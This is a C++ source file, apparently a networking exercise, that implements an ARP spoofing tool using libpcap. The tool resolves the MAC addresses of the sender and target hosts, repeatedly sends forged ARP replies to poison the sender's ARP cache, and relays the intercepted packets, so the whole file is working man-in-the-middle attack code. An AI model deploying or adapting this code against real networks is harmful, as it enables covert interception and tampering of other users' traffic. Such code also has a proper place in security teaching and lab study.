#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <vector>
#include <arpa/inet.h>
#include <thread>
#include <unistd.h>
#include "sendarp_header.h"

using namespace std;

void usage();
void get_mac_ip();
int send_packet(Session* a, int opcode);
int get_packet(Session* a, int opcode);
void arp_poisoning(vector<Session*> Sessions);
void arp_relaying(vector<Session*> Sessions);
uint16_t my_ntohs(uint16_t n);

unsigned char packet1[2000];
unsigned char packet2[2000];
unsigned char packet3[2000];
unsigned char packet4[2000];

unsigned char my_ip_addr[4] = {0};
unsigned char my_mac_addr[6] = {0};

uint8_t broad_mac_addr[] = {"\xff\xff\xff\xff\xff\xff"};
uint8_t zero_mac_addr[] = {"\x00\x00\x00\x00\x00\x00"};

unsigned char victim_ip[4] = {0};
unsigned char router_ip[4] = {0};

unsigned char arp_dummy[] = "\x00\x01\x08\x00\x06\x04";
unsigned char arp_opcode_request[] = "\x00\x01";
unsigned char arp_opcode_reply[] = "\x00\x02";
char* interface;

int main(int argc, char* argv[]){

    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    /* Make Sessions */
    vector<Session*> Sessions;
    Session *temp;
    for(int i = 1; i < argc/2; i++){
        temp = new Session;
        in_addr maskAddr;
        inet_aton(argv[2*i], &maskAddr);
        memcpy(temp->sender_ip, &maskAddr, 4);
        inet_aton(argv[2*i+1], &maskAddr);
        memcpy(temp->target_ip, &maskAddr, 4);
        Sessions.push_back(temp);
    }

    interface = argv[1];
    get_mac_ip();

    /* get sender_mac, target_mac for each sessions */
    for(auto a : Sessions){
        get_packet(a, 1);
        get_packet(a, 2);
    }
    std::thread thread1(&arp_poisoning, Sessions);
    std::thread thread2(&arp_relaying, Sessions);
    thread1.join();
    thread2.join();

}

void arp_poisoning(vector<Session*> Sessions){
    while(true){
        for(auto b : Sessions){
            send_packet(b, 3);
            printf("send repoisoning packet!");
        }
        sleep(1);
    }
}

void arp_relaying(vector<Session*> Sessions){
    const char *dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    struct pcap_pkthdr* header;
    const u_char* packet;
    pcap_t *fp;
    size_t packet_length = 0;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        const Ethernet* ethernet = reinterpret_cast<const Ethernet *>(packet);
        const IP* ip = reinterpret_cast<const IP *>(packet + 14);
        const uint8_t* sender_mac = ethernet->Smac;
        for(auto c : Sessions){
            if(!memcmp(c->sender_mac, sender_mac, 6)){
                if(my_ntohs(ethernet->type) == 0x0806) break;
                packet_length = my_ntohs(ip->total_length) + 14;
                memcpy(packet2, packet, packet_length);
                memcpy(packet2, c->target_mac,6);
                memcpy(packet2 + 6, my_mac_addr, 6);

                for(int i=0; i<100; i++){
                    printf("%X ",packet2[i]);
                }

                fp= pcap_open_live(interface, 2000, 1, 100, errbuf);
                pcap_sendpacket(fp, const_cast<const unsigned char*>(packet2), packet_length);
                printf("YEAH! Relay packet success!\n length : %d\n type: %x %x",packet_length, packet2[12],packet2[13]);
                break;
            }
        }

    }
}

void usage(){
    printf("arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
}

void get_mac_ip(){
    struct ifreq s;
    struct ifreq ifr;

    int fd1 = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    int fd2 = socket(AF_INET, SOCK_DGRAM, 0);

    strcpy(s.ifr_name, interface);
    if (0 == ioctl(fd1, SIOCGIFHWADDR, &s)) {

        memcpy(my_mac_addr, s.ifr_addr.sa_data, 6);
        printf("my mac addr : ");
        for (int i = 0; i < 6; ++i)
            printf("%02x ", (unsigned char) my_mac_addr[i]);
        putchar('\n');
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    if (0 == ioctl(fd2, SIOCGIFADDR, &ifr)) {
        printf("my ip addr : ");
        memcpy(my_ip_addr, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);
        for(int i = 0; i < 4; ++i)
            printf("%d ",my_ip_addr[i]);
        putchar('\n');
    }
}

int send_packet(Session* a, int opcode){
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    int pointer;

    /* Open the output device */
    if ( (fp= pcap_open_live(interface,     // name of the device(interface_name)
                             2000,                // portion of the packet to capture (only the first 100 bytes)
                             1,                  // PCAP_OPENFLAG_PROMISCUOUS
                             100,               // read timeout
                             errbuf              // error buffer
                             ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", "ens33");
        return -1;
    }

    pointer = 0;
    Ethernet* ethernet = reinterpret_cast<Ethernet *>(packet1);
    ARP* arp = reinterpret_cast<ARP *>(packet1 + 14);
    switch(opcode)
    {
    /* case 1 : get_sender_mac */
    case 1:
        memcpy(ethernet->Dmac, broad_mac_addr, 6);
        memcpy(ethernet->Smac, my_mac_addr, 6);
        memcpy(&ethernet->type, "\x08\x06", 2);

        memcpy(arp->dummy, arp_dummy, 6);
        memcpy(arp->opcode, arp_opcode_request, 2);
        memcpy(arp->sender_mac, my_mac_addr, 6);
        memcpy(arp->sender_ip, my_ip_addr, 4);
        memcpy(arp->target_mac, zero_mac_addr, 6);
        memcpy(arp->target_ip, a->sender_ip, 4);
        break;
        /* case 2 : get_target_mac */
    case 2:
        memcpy(arp->target_ip, a->target_ip, 4);
        break;
        /* case 3 : poisoning ARP table */
    case 3:
        memcpy(ethernet->Dmac, a->sender_mac, 6);
        memcpy(ethernet->Smac, my_mac_addr, 6);
        memcpy(&ethernet->type, "\x08\x06", 2);

        memcpy(arp->dummy, arp_dummy, 6);
        memcpy(arp->opcode, arp_opcode_reply, 2);
        memcpy(arp->sender_mac, my_mac_addr, 6);
        memcpy(arp->sender_ip, a->target_ip, 4);
        memcpy(arp->target_mac, a->sender_mac, 6);
        memcpy(arp->target_ip, a->sender_ip, 4);
        break;
    }
    pcap_sendpacket(fp, const_cast<const unsigned char*>(packet1), 42);
    printf("packet send!\n");
    return 0;
}

int get_packet(Session* a, int opcode){
    const char *dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    struct pcap_pkthdr* header;
    const u_char* packet;

    switch(opcode){
    case 1:
        while (true) {
            send_packet(a, 1);
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            int pointer = 14;
            const ARP* arp = reinterpret_cast<const ARP *>(packet + pointer);
            if(!memcmp(a->sender_ip, arp->sender_ip, 4)){
                memcpy(a->sender_mac, arp->sender_mac, 6);
                printf("Gotcha! I Got the sender mac addr.\n");
                break;
            }
        }
        return 0;
    case 2:
        while (true) {
            send_packet(a, 2);
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            int pointer = 14;
            const ARP* arp = reinterpret_cast<const ARP *>(packet + pointer);
            if(!memcmp(a->target_ip, arp->sender_ip, 4)){
                memcpy(a->target_mac, arp->sender_mac, 6);
                printf("Gotcha! I Got the target mac addr.\n");
                break;
            }
        }
        return 0;
    }
}

uint16_t my_ntohs(uint16_t n) { // network byte order to host byte order (2 byte)
    return (n & 0xff00) >> 8 | (n & 0xff) << 8 ;
}


